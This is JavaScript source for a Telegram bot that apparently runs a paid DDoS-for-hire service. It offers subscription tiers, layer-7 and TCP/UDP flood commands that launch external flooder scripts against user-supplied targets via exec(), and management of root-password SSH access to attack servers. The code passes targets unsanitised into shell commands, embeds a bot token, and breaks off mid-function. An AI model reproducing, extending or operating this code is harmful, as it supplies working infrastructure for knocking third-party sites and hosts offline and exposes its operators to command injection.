const axios = require('axios');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const https = require("https");
const { Client } = require("ssh2");
const path = require("path");

const token = '8365591890:AAFAeiWuMJV-ggCaq9BGwyIny7YYUGqTVOI';
const bot = new TelegramBot(token, { polling: true });
const adminFile = 'AdminId.json';
const plansFile = 'plans.json';
const claimsFile = 'claimCodes.json';
let adminIds = [];
try {
    adminIds = JSON.parse(fs.readFileSync(adminFile));
} catch (error) {
    console.error('Error loading AdminId.json:', error);
}

let plansData = [];
try {
    plansData = JSON.parse(fs.readFileSync(plansFile));
} catch (error) {
    console.error('Error loading plans.json:', error);
}

let claimCodes = [];
try {
    claimCodes = JSON.parse(fs.readFileSync(claimsFile));
} catch (error) {
    console.error('Error loading claimCodes.json:', error);
}

let vpsList = [];
try {
    vpsList = JSON.parse(fs.readFileSync("vps_list.json", "utf8"));
} catch (err) {
    console.error("Error saat membaca file konfigurasi:", err.message);
    process.exit(1);
}

function isUserInPlans(chatId) {
    const plansData = loadJSON('plans.json');
    return plansData.some(plan => plan.id === chatId);
}
function saveClaimCodes() {
    fs.writeFileSync(claimsFile, JSON.stringify(claimCodes, null, 2));
}

function generateClaimCode() {
    return Math.random().toString(36).substr(2, 12);
}
function loadJSON(filename) {
    try {
        return JSON.parse(fs.readFileSync(filename, 'utf8'));
    } catch (error) {
        console.error(`Error loading ${filename}:`, error);
        return [];
    }
}

function saveJSON(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function saveVpsList() {
    try {
        fs.writeFileSync("vps_list.json", JSON.stringify(vpsList, null, 2));
    } catch (err) {
        console.error("Error saat menyimpan vps_list.json:", err.message);
    }
}

function cleanExpiredPlans() {
    const currentTime = Date.now();
    let plansData = loadJSON(plansFile);

    plansData = plansData.filter(plan => plan.expiry > currentTime);

    saveJSON(plansFile, plansData);
}
function isAdmin(chatId) {
    return adminIds.includes(chatId);
}
function getUserPlan(chatId) {
    const plansData = loadJSON('plans.json');
    const userPlan = plansData.find(plan => parseInt(plan.id, 10) === parseInt(chatId, 10));
    return userPlan ? userPlan.planType : "None";
}

function getPlanLimits(chatId) { 
    const userPlan = getUserPlan(chatId);

    if (userPlan === "SuperVIP") {
        return { planType: "SuperVIP", concurrent: 5, timeLimit: 300 };
    } else if (userPlan === "VIP") {
        return { planType: "VIP", concurrent: 3, timeLimit: 120 };
    } else if (userPlan === "Basic") {
        return { planType: "Basic", concurrent: 1, timeLimit: 80 };
    }

    return { planType: "None", concurrent: 0, timeLimit: 0 };
}

const activeAttacks = new Map();
const cooldowns = new Map();

function getUserConcurrent(chatId) {
    return activeAttacks.has(chatId) ? activeAttacks.get(chatId).length : 0;
}

function addActiveAttack(chatId, target, method, duration) {
    let ongoingAttacks = activeAttacks.get(chatId) || [];
    ongoingAttacks.push({ target, method, duration, startTime: Date.now() });
    activeAttacks.set(chatId, ongoingAttacks);

    removeAttackAfterDuration(chatId, target, duration);
}

function removeAttackAfterDuration(chatId, target, duration) {
    setTimeout(() => {
        let ongoingAttacks = activeAttacks.get(chatId) || [];
        ongoingAttacks = ongoingAttacks.filter(attack => attack.target !== target);
        activeAttacks.set(chatId, ongoingAttacks);
    }, duration * 1000);
}

function removeActiveAttack(chatId, endTime) {
    if (activeAttacks.has(chatId)) {
        const attacks = activeAttacks.get(chatId);
        const index = attacks.findIndex(attack => (Date.now() - attack.time) >= attack.duration);
        if (index !== -1) {
            attacks.splice(index, 1);
            console.log(`Attack removed for chatId: ${chatId}`);
        }
    }
}

function resetUserConcurrentAfterCooldown(chatId) {
    setTimeout(() => {
        const { concurrent } = getPlanLimits(chatId);
        activeAttacks.set(chatId, []);
        cooldowns.delete(chatId);
        bot.sendMessage(chatId, `💨 <b>Your concurrent has been restored!</b>`, { parse_mode: "HTML" });
    }, 5 * 60 * 1000);
}

function getSSLCertificate(url) {
    return new Promise((resolve) => {
        const hostname = new URL(url).hostname;
        const options = { host: hostname, port: 443, method: 'GET' };

        const req = https.request(options, (res) => {
            const cert = res.socket.getPeerCertificate();
            if (cert && cert.issuer && cert.issuer.O) {
                resolve(cert.issuer.O);
            } else {
                resolve(null);
            }
        });

        req.on('error', () => resolve(null));
        req.end();
    });
}

// /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendVideo(chatId, "https://files.catbox.moe/3xs7u6.mp4", {
    caption: `
\`\`\`    
╭─────────────────────────────
│ Developer : Rizztzy
│ Versi     : 1.0
│ Nama Bot  : 𝗗𝗗𝗼𝗦 𝗩𝗜𝗣
╰─────────────────────────────
╭──「  Perintah Bantuan  」──╮
│ /info      /plan     /claim
│ /ongoing   /detect   /http
│ /addown    /delown   /listown
│ /addsrv    /delsrv   /listsrv
│ /listuser  /install  /upload
╰─────────────────────────────
╭──「  𝗕𝗮𝘀𝗶𝗰  」──╮
│ /cibi
│ /pidoras
│ /flood
│ /tcp = 1.1.1.1 80 200
│ /udp = 1.1.1.1 80 200
╰─────────────────────────────
╭──「  𝗦𝘂𝗽𝗲𝗿𝗩𝗶𝗽  」──╮
│ /bypass
│ /thunder
│ /destroy
│ /floodvip
│ /mixbil
│ /h2-fumi
│ /h2-devil
│ /h2-bypass
│ /h2-flood
│ /httpcostum
│ /tcp = 1.1.1.1 80 200
│ /udp = 1.1.1.1 80 200
╰─────────────────────────────
\`\`\`
   `,
    parse_mode: 'Markdown',
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 🐛Beli Paket? 」", url: "https://t.me/TzyAmba" }]
      ]
    }
  });
});
// /plan command
bot.onText(/\/plan/, (msg) => {
    const chatId = msg.chat.id;

    const planMessage = `<b>📢🔥 Choose Your Plan! 🔥</b>\n\n<pre>` +
    `{\n` +
    `  "Basic Plan": {\n` +
    `    "1 Week": "40K IDR",\n` +
    `    "2 Weeks": "60K IDR",\n` +
    `    "3 Weeks": "80K IDR",\n` +
    `    "Attack Duration": "80s",\n` +
    `    "Concurrency": 1,\n` +
    `    "Method": "Basic"\n` +
    `  },\n` +
    `  "VIP Plan": {\n` +
    `    "1 Week": "60K IDR",\n` +
    `    "2 Weeks": "80K IDR",\n` +
    `    "3 Weeks": "120K IDR",\n` +
    `    "Attack Duration": "120s",\n` +
    `    "Concurrency": 3,\n` +
    `    "Method": "VIP"\n` +
    `  },\n` +
    `  "SuperVIP Plan": {\n` +
    `    "1 Week": "100K IDR",\n` +
    `    "2 Weeks": "120K IDR",\n` +
    `    "3 Weeks": "180K IDR",\n` +
    `    "Attack Duration": "120s",\n` +
    `    "Concurrency": 3,\n` +
    `    "Method": "SuperVIP"\n` +
    `  },\n` +
    `  "Payment Methods": ["Dana", "GoPay", "QRIS"]\n` +
    `}</pre>\n\n🛒 <b>Click the button below to proceed with payment ⬇</b>`;

    bot.sendMessage(chatId, planMessage, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [
                [{ text: "👑 Contact Admin 👑", url: "https://t.me/TzyAmba" }]
            ]
        }
    });
});

// Command layer7
bot.onText(/\/(flood|glory|cibi|quantum|destroy|pidoras|bypass|thunder|floodvip|mixbil|h2-devil|h2-bypass|h2-fumi|h2-flood|httpcostum) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const command = match[1];
    const args = match[2].split(' ');

    const { timeLimit, concurrent, planType } = getPlanLimits(chatId);

    const supervipCommands = ["cibi", "glory", "flood", "quantum", "pidoras", "bypass", "destroy", "thunder", "floodvip", "mixbil", "h2-devil", "h2-bypass", "h2-fumi", "httpcostum", "h2-flood"];
    const vipCommands = ["cibi", "glory", "flood", "quantum", "pidoras", "bypass", "destroy", "thunder", "floodvip", "httpcostum"];
    const basicCommands = ["flood", "cibi", "pidoras"];

    if (
        (planType === "SuperVIP" && !supervipCommands.includes(command)) ||
        (planType === "Basic" && !basicCommands.includes(command)) ||
        (planType === "VIP" && !vipCommands.includes(command)) ||
        planType === "None"
    ) {
        return bot.sendMessage(chatId, `❌ <b>This command is only available for ${planType} users.</b>`, { parse_mode: "HTML" });
    }

    if (getUserConcurrent(chatId) >= concurrent) {
        return bot.sendMessage(chatId, `❌ <b>You have reached your attack limit.</b>\nConcurrent: <b>${getUserConcurrent(chatId)}/${concurrent}</b>`, { parse_mode: "HTML" });
    }
    const blacklistedDomains = [".dev", ".gov", ".r2dev"];

    if (args.length < 2) {
        return bot.sendMessage(chatId, `❌ <b>Incorrect format.</b>\n<b>Example:</b> <code>/${command} https://example.com 200</code>`, { parse_mode: "HTML" });
    }

    const target = args[0];
    let time = parseInt(args[1], 10);

    if (blacklistedDomains.some(domain => target.endsWith(domain))) {
        return bot.sendMessage(chatId, `❌ <b>Target domain ${target} not allowed (blacklist).</b>`, { parse_mode: "HTML" });
    }

    if (isNaN(time) || time <= 0) {
        return bot.sendMessage(chatId, `❌ <b>Invalid time specified.</b> Please enter a valid number.`, { parse_mode: "HTML" });
    }

    if (time > timeLimit) {
        return bot.sendMessage(chatId, `❌ <b>Time limit exceeded.</b> Max allowed: <code>${timeLimit}</code> seconds.`, { parse_mode: "HTML" });
    }
    
    cooldowns.set(chatId, Date.now());

    let commandExec;
    switch (command) {
        case 'flood':
            commandExec = `node cache/flood.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/floodapi.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/floodv2.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'glory':
            commandExec = `node cache/glory.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'cibi':
            commandExec = `node cache/cibi.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'quantum':
            commandExec = `node cache/quantum.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'destroy':
            commandExec = `node cache/destroy.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'pidoras':
            commandExec = `node cache/pidoras.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'bypass':
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/floodapi.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/glory.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'thunder':
            commandExec = `node cache/thunder.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'floodvip':
            commandExec = `node cache/floodvip.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/flood.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/floodapi.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/floodv2.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'mixbil':
            commandExec = `node cache/mixbil.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'h2-devil':
            commandExec = `node cache/h2-devil.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'h2-bypass':
            commandExec = `node cache/h2-bypass.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'h2-fumi':
            commandExec = `node cache/h2-fumi.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        case 'h2-flood':
            commandExec = `node cache/h2-flood.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/floodvip.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/flood.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/floodapi.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/floodv2.js ${target} ${time} 100 10 proxy.txt`;
        case 'h2-blast':
            commandExec = `node cache/h2-blast.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
        case 'httpcostum':
            commandExec = `node cache/httpcostum.js ${target} ${time} 100 10 proxy.txt`;
            commandExec = `node cache/bypass.js ${target} ${time} 100 10 proxy.txt`;
            break;
        default:
            return bot.sendMessage(chatId, `❌ <b>Invalid method specified.</b>`, { parse_mode: "HTML" });
    }

    addActiveAttack(chatId, target, command.toUpperCase(), time);

    bot.sendMessage(chatId, 
    `<b>🚨 Attack Sent Sucessfully!! 🚨</b>\n` +
    `<pre>` +
    `{\n` +
    `  "status": "success",\n` +
    `  "host": "${target}",\n` +
    `  "time": ${time} Seconds,\n` +
    `  "method": "${command.toUpperCase()}",\n` +
    `  "concurrent": "${getUserConcurrent(chatId)}/${concurrent}",\n` +
    `  "owner": "@TzyAmba"\n` +
    `  "note": "don't spam attack."\n` +
    `}` +
    `</pre>`, 
    { parse_mode: "HTML", disable_web_page_preview: true }
    );

    try {
        const attackProcess = exec(commandExec, { detached: true, stdio: "ignore" });
        attackProcess.unref();

        setTimeout(() => {
            removeActiveAttack(chatId);
            if (getUserConcurrent(chatId) === concurrent) {
                cooldowns.set(chatId, Date.now());
                resetUserConcurrentAfterCooldown(chatId);
            }
        }, time * 1000);
    } catch (error) {
        console.error(`❌ Error executing attack method: ${error.message}`);
        bot.sendMessage(chatId, `❌ <b>Failed to execute attack.</b> Please try again later.`, { parse_mode: "HTML" });
    }
});

//command layer4
bot.onText(/^\/(tcp|udp)\s+(.+)$/, (msg, match) => {
    const chatId = msg.chat.id;
    const command = match[1];
    const args = match[2].split(' ');

    const { timeLimit, concurrent, planType } = getPlanLimits(chatId);

    const supervipCommands = ["tcp", "udp"];
    const vipCommands = ["tcp", "udp"];
    const basicCommands = ["tcp", "udp"];

    if (
        (planType === "SuperVIP" && !supervipCommands.includes(command)) ||
        (planType === "Basic" && !basicCommands.includes(command)) ||
        (planType === "VIP" && !vipCommands.includes(command)) ||
        planType === "None"
    ) {
        return bot.sendMessage(chatId, `❌ <b>This command is only available for ${planType} users.</b>`, { parse_mode: "HTML" });
    }

    if (getUserConcurrent(chatId) >= concurrent) {
        return bot.sendMessage(chatId, `❌ <b>You have reached your attack limit.</b>\nConcurrent: <b>${getUserConcurrent(chatId)}/${concurrent}</b>`, { parse_mode: "HTML" });
    }

    if (args.length < 3) {
        return bot.sendMessage(chatId, `❌ <b>Incorrect format.</b>\n<b>Example:</b> <code>/${command} 1.1.1.1 80 200</code>`, { parse_mode: "HTML" });
    }

    const host = args[0];
    const port = parseInt(args[1], 10);
    let time = parseInt(args[2], 10);

    if (!isValidIP(host)) {
        return bot.sendMessage(chatId, `❌ <b>Invalid IP address.</b> Please enter a valid host.`, { parse_mode: "HTML" });
    }

    if (isNaN(port) || port <= 0 || port > 65535) {
        return bot.sendMessage(chatId, `❌ <b>Invalid port specified.</b> Must be between 1-65535.`, { parse_mode: "HTML" });
    }

    if (isNaN(time) || time <= 0 || time > timeLimit) {
        return bot.sendMessage(chatId, `❌ <b>Invalid or exceeded time limit.</b> Max allowed: <code>${timeLimit}</code> seconds.`, { parse_mode: "HTML" });
    }
    
    cooldowns.set(chatId, Date.now());

    let commandExec;
    switch (command) {
        case 'tcp':
            commandExec = `node cache/tcp.js ${host} ${port} ${time}`;
            break;
        case 'udp':
            commandExec = `node cache/udp.js ${host} ${port} ${time}`;
            break;
        default:
            return bot.sendMessage(chatId, `❌ <b>Invalid method specified.</b>`, { parse_mode: "HTML" });
    }

    addActiveAttack(chatId, host, command.toUpperCase(), time);

    bot.sendMessage(chatId, 
    `<b>🚨 Attack Sent Sucessfully!!🚨</b>\n` +
    `<pre>` +
    `{\n` +
    `  "status": "success",\n` +
    `  "host": "${host}",\n` +
    `  "port": ${port},\n` +
    `  "time": ${time} Seconds,\n` +
    `  "method": "${command.toUpperCase()}",\n` +
    `  "concurrent": "${getUserConcurrent(chatId)}/${concurrent}",\n` +
    `  "owner": "@TzyAmba"\n` +
    `  "note": "don't spam attack."\n` +
    `}` +
    `</pre>`, 
    { parse_mode: "HTML", disable_web_page_preview: true }
    );

    try {
        const attackProcess = exec(commandExec, { detached: true, stdio: "ignore" });
        attackProcess.unref();

        setTimeout(() => {
            removeActiveAttack(chatId);
            if (getUserConcurrent(chatId) === concurrent) {
                cooldowns.set(chatId, Date.now());
                resetUserConcurrentAfterCooldown(chatId);
            }
        }, time * 1000);
    } catch (error) {
        console.error(`❌ Error executing attack method: ${error.message}`);
        bot.sendMessage(chatId, `❌ <b>Failed to execute attack.</b> Please try again later.`, { parse_mode: "HTML" });
    }
});

function isValidIP(ip) {
    return /^(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])(\.(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])){3}$/.test(ip);
}
// command /ongoing
bot.onText(/\/ongoing/, (msg) => {
    const chatId = msg.chat.id;
    const { planType } = getPlanLimits(chatId);

    if (!["Basic", "VIP", "SuperVIP"].includes(planType)) {
        return bot.sendMessage(chatId, `❌ <b>You are not allowed to use this command.</b>`, { parse_mode: "HTML" });
    }

    let ongoingAttacks = activeAttacks.get(chatId) || [];

    ongoingAttacks = ongoingAttacks.filter(attack => {
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        return elapsed < attack.duration;
    });

    activeAttacks.set(chatId, ongoingAttacks);

    if (ongoingAttacks.length === 0) {
        return bot.sendMessage(chatId, "⚠️ <b>No ongoing attacks.</b>", { parse_mode: "HTML" });
    }

    let response = `<b>🚨 Ongoing Attack 🚨</b>\n<pre>` + `[\n`;
    ongoingAttacks.forEach((attack, index) => {
        const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
        const remaining = Math.max(0, attack.duration - elapsed);
        response += `  {\n` +
                    `    "status": "is attacking",\n` +
                    `    "host": "${attack.target}",\n` +
                    `    "method": "${attack.method}",\n` +
                    `    "since": "${elapsed} sec ago",\n` +
                    `    "duration": "${attack.duration} sec",\n` +
                    `    "remaining": "${remaining} sec"\n` +
                    `  }${index !== ongoingAttacks.length - 1 ? ',' : ''}\n`;
    });
    response += `]</pre>`;

    bot.sendMessage(chatId, response, { parse_mode: "HTML" });
});

// /addown command
bot.onText(/\/addown (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const newAdminId = parseInt(match[1], 10);

    if (!isAdmin(chatId)) {
        return bot.sendMessage(chatId, '❌ <b>You do not have permission to use this command.</b>', { parse_mode: "HTML" });
    }

    if (adminIds.includes(newAdminId)) {
        return bot.sendMessage(chatId, '❌ <b>This user is already an admin.</b>', { parse_mode: "HTML" });
    }

    adminIds.push(newAdminId);
    saveJSON(adminFile, adminIds);

    bot.sendMessage(chatId, `✅ <b>User with ID ${newAdminId} has been added as an admin.</b>`, { parse_mode: "HTML" });
});

// /delown command
bot.onText(/\/delown (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const adminToRemove = parseInt(match[1], 10);

    if (!isAdmin(chatId)) {
        return bot.sendMessage(chatId, '❌ <b>You do not have permission to use this command.</b>', { parse_mode: "HTML" });
    }

    if (!adminIds.includes(adminToRemove)) {
        return bot.sendMessage(chatId, '❌ <b>This user is not an admin.</b>', { parse_mode: "HTML" });
    }

    adminIds = adminIds.filter(id => id !== adminToRemove);
    saveJSON(adminFile, adminIds);

    bot.sendMessage(chatId, `✅ <b>User with ID ${adminToRemove} has been removed from admins.</b>`, { parse_mode: "HTML" });
});

//command /listown
bot.onText(/\/listown/, (msg) => {
    const chatId = msg.chat.id;

    if (!isAdmin(chatId)) {
        return bot.sendMessage(chatId, '❌ <b>You do not have permission to use this command.</b>', { parse_mode: "HTML" });
    }

    if (adminIds.length === 0) {
        return bot.sendMessage(chatId, 'ℹ️ <b>No admins found.</b>', { parse_mode: "HTML" });
    }

    let adminList = `<b>🦊 List of Owners:</b>\n\n<pre>` + `{\n`;
    adminIds.forEach((id, index) => {
        adminList += `  "Admin ${index + 1}": "${id}"${index !== adminIds.length - 1 ? ',' : ''}\n`;
    });
    adminList += `}</pre>`;

    bot.sendMessage(chatId, adminList, { parse_mode: "HTML" });
});

bot.onText(/\/addsrv (\d+\.\d+\.\d+\.\d+) ([^\s]+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, "❌ You do not have permission to use this command..");
    }

    const ip = match[1];
    const password = match[2];
    const port = parseInt(match[3], 10);

    const existingVps = vpsList.find((v) => v.ip === ip);
    if (existingVps) {
        return bot.sendMessage(chatId, `❌ VPS dengan IP ${ip} sudah terdaftar di index ${existingVps.index}.`);
    }

    const newIndex = vpsList.length > 0 ? vpsList[vpsList.length - 1].index + 1 : 1;

    const newVps = { index: newIndex, ip, password, port };
    vpsList.push(newVps);
    saveVpsList();

    bot.sendMessage(chatId, `✅ VPS baru berhasil ditambahkan:\nIndex: ${newIndex}\nIP: ${ip}\nPort: ${port}`);
});

bot.onText(/\/upload (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const indexVps = parseInt(match[1], 10);

    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, "❌ You do not have permission to use this command.");
    }

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ Harap reply pesan yang berisi file .txt dengan perintah /upload <indexvps>.");
    }

    const vps = vpsList.find((v) => v.index === indexVps);
    if (!vps) {
        return bot.sendMessage(chatId, `❌ VPS dengan indeks ${indexVps} tidak ditemukan.`);
    }

    const document = msg.reply_to_message.document;
    const fileId = document.file_id;
    const fileName = document.file_name;
    const fileExt = fileName.split(".").pop().toLowerCase();

    if (fileExt !== "txt") {
        return bot.sendMessage(chatId, "❌ Hanya file .txt yang diperbolehkan.");
    }

    bot.sendMessage(chatId, `📥 Mengunduh file untuk VPS "${vps.ip}"...`);

    try {
        const fileLink = await bot.getFileLink(fileId);
        const filePath = "./proxy.txt";

        const fileStream = fs.createWriteStream(filePath);
        https.get(fileLink, (response) => {
            response.pipe(fileStream);
            fileStream.on("finish", () => {
                fileStream.close();

                const conn = new Client();
                conn
                    .on("ready", () => {
                        bot.sendMessage(chatId, `🚀 Mengunggah file ke VPS "${vps.ip}"...`);
                        conn.sftp((err, sftp) => {
                            if (err) {
                                bot.sendMessage(chatId, "❌ Gagal membuka SFTP.");
                                return conn.end();
                            }

                            sftp.fastPut(filePath, "./TAR/proxy.txt", (err) => {
                                if (err) {
                                    bot.sendMessage(chatId, "❌ Gagal mengunggah file.");
                                } else {
                                    bot.sendMessage(chatId, `✅ File berhasil diunggah ke VPS "${vps.ip}"!`);
                                }
                                conn.end();
                            });
                        });
                    })
                    .on("error", () => {
                        bot.sendMessage(chatId, `❌ Gagal terhubung ke VPS "${vps.ip}".`);
                    })
                    .connect({
                        host: vps.ip,
                        port: vps.port || 22,
                        username: "root",
                        password: vps.password,
                    });
            });
        });
    } catch (err) {
        bot.sendMessage(chatId, "❌ Gagal mengunduh file dari Telegram.");
        console.error(err);
    }
});

bot.onText(/\/listsrv/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isAdmin(userId)) return bot.sendMessage(chatId, "❌ You do not have permission to use this command.");

    let onlineCount = 0;
    let offlineCount = 0;
    let statusMessage = "<b>🖥 VPS Status:</b>\n\n<pre>[\n";

    const checkVPS = async (vps, index) => {
        return new Promise((resolve) => {
            const conn = new Client();
            conn
                .on('ready', () => {
                    conn.exec("top -bn1 | grep 'Cpu(s)' | awk '{print $2 + $4}'", (err, stream) => {
                        if (err) {
                            offlineCount++;
                            resolve(`  { "VPS${index + 1}": "offline" }`);
                            conn.end();
                            return;
                        }
                        stream
                            .on('data', (data) => {
                                const cpuUsage = parseFloat(data.toString().trim());
                                onlineCount++;
                                resolve(`  { "VPS${index + 1}": "online", "CPU Usage": "${cpuUsage.toFixed(1)}%" }`);
                            })
                            .on('close', () => conn.end());
                    });
                })
                .on('error', () => {
                    offlineCount++;
                    resolve(`  { "VPS${index + 1}": "offline" }`);
                })
                .connect({
                    host: vps.ip,
                    port: vps.port,
                    username: 'root',
                    password: vps.password,
                });
        });
    };

    const results = await Promise.all(vpsList.map(checkVPS));
    statusMessage += results.join(",\n") + `\n]</pre>\n\n<b>Servers online:</b> ${onlineCount}\n<b>Servers offline:</b> ${offlineCount}`;

    bot.sendMessage(chatId, statusMessage, { parse_mode: "HTML" });
});

bot.onText(/\/delsrv (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAdmin(userId)) 
  return bot.sendMessage(chatId, "❌ You do not have permission to use this command.");

  const nameOrIndex = match[1];
  const index = parseInt(nameOrIndex);
  const vps = !isNaN(index)
    ? vpsList.find((v) => v.index === index)
    : vpsList.find((v) => v.name === nameOrIndex);

  if (!vps) return bot.sendMessage(chatId, "❌ VPS tidak ditemukan.");

  vpsList.splice(vpsList.indexOf(vps), 1);
  saveVpsList();

  bot.sendMessage(chatId, `✅ VPS berhasil dihapus: ${vps.name}`);
});


//command /give <duration> <Basic/VIP|SuperVIP>
bot.onText(/\/give (\d+[smhd]) (Basic|VIP|SuperVIP)/, (msg, match) => {
    const chatId = msg.chat.id;
    const duration = match[1];
    const planType = match[2];

    if (!isAdmin(chatId)) {
        return bot.sendMessage(chatId, '❌ <b>You do not have permission to use this command.</b>', { parse_mode: "HTML" });
    }

    let expiryTime;
    const currentTime = Date.now();
    if (duration.endsWith('s')) {
        expiryTime = currentTime + parseInt(duration) * 1000;
    } else if (duration.endsWith('m')) {
        expiryTime = currentTime + parseInt(duration) * 60000;
    } else if (duration.endsWith('h')) {
        expiryTime = currentTime + parseInt(duration) * 3600000;
    } else if (duration.endsWith('d')) {
        expiryTime = currentTime + parseInt(duration) * 86400000;
    }

    const claimCode = generateClaimCode();
    const plansData = loadJSON('plans.json');
    plansData.push({ id: chatId, expiry: expiryTime, claimed: false, claimCode: claimCode, planType: planType });
    saveJSON('plans.json', plansData);

    const claimCodes = loadJSON('claimCodes.json');
    claimCodes.push({ code: claimCode, expiry: expiryTime, planType: planType });
    saveJSON('claimCodes.json', claimCodes);

    bot.sendMessage(chatId, `✅ Your <b>${planType}</b> plan has been given!\n⏳ Expiry: <b>${new Date(expiryTime).toLocaleString()}</b>\n🔑 Claim using: <code>/claim ${claimCode}</code>`, { parse_mode: "HTML" });
});

//command /claim <code>
bot.onText(/\/claim (\w{10,12})/, (msg, match) => {
    const chatId = msg.chat.id;
    const claimCode = match[1];

    let claimCodes = loadJSON('claimCodes.json');
    const claim = claimCodes.find(c => c.code === claimCode);

    if (!claim) {
        return bot.sendMessage(chatId, '❌ Invalid or expired claim code.', { parse_mode: 'HTML' });
    }

    if (Date.now() > claim.expiry) {
        return bot.sendMessage(chatId, '❌ This claim code has expired.', { parse_mode: 'HTML' });
    }

    let plansData = loadJSON('plans.json');
    let userPlan = plansData.find(plan => plan.id === chatId);

    if (!userPlan) {
        userPlan = { id: chatId, claimed: true, expiry: claim.expiry, planType: claim.planType };
        plansData.push(userPlan);
    } else {
        userPlan.claimed = true;
        userPlan.expiry = claim.expiry;
        userPlan.planType = claim.planType;
    }

    claimCodes = claimCodes.filter(c => c.code !== claimCode);
    saveJSON('claimCodes.json', claimCodes);
    saveJSON('plans.json', plansData);

    const planLimits = getPlanLimits(chatId);

    bot.sendMessage(chatId, `✅ <b>Plan Successfully Claimed!</b>\n💎 Plan: <b>${planLimits.planType}</b>\n⏳ Expiry: <b>${new Date(userPlan.expiry).toLocaleString()}</b>\n⚡ Attack Time Limit: <b>${planLimits.timeLimit}s</b>\n🔄 Concurrent: <b>${planLimits.concurrent}</b>`, { parse_mode: "HTML" });
});

//command /info
bot.onText(/\/info/, (msg) => {
    const chatId = msg.chat.id;
    const plansData = loadJSON('plans.json');
    const userPlan = plansData.find(plan => plan.id === chatId);

    if (!userPlan || !userPlan.claimed) {
        return bot.sendMessage(chatId, '❌ <b>You are not registered in any plan.</b>', { parse_mode: 'HTML' });
    }

    const planLimits = getPlanLimits(chatId);
    const planInfo = {
        "User ID": chatId,
        "Plan": userPlan.planType,
        "Expiry": new Date(userPlan.expiry).toLocaleString(),
        "Attack Time Limit": `${planLimits.timeLimit}s`,
        "Concurrent": planLimits.concurrent
    };

    bot.sendMessage(chatId, `<b>✅ Your Plan Details:</b>\n\n<pre>${JSON.stringify(planInfo, null, 2)}</pre>`, { parse_mode: 'HTML' });
});

//command /listuser (Admin Only)
bot.onText(/\/listuser/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAdmin(chatId)) {
        return bot.sendMessage(chatId, '❌ <b>You do not have permission to use this command.</b>', { parse_mode: "HTML" });
    }

    const plansData = loadJSON('plans.json');
    if (plansData.length === 0) {
        return bot.sendMessage(chatId, '❌ <b>No active plans at the moment.</b>', { parse_mode: "HTML" });
    }

    let planList = "<b>📜 Active Plans:</b>\n\n";
    plansData.forEach(plan => {
        const expiryDate = new Date(plan.expiry);
        const planInfo = {
            "User ID": plan.id,
            "Plan": plan.planType,
            "Expiry": expiryDate.toLocaleString(),
            "Status": plan.claimed ? "Active" : "Pending"
        };

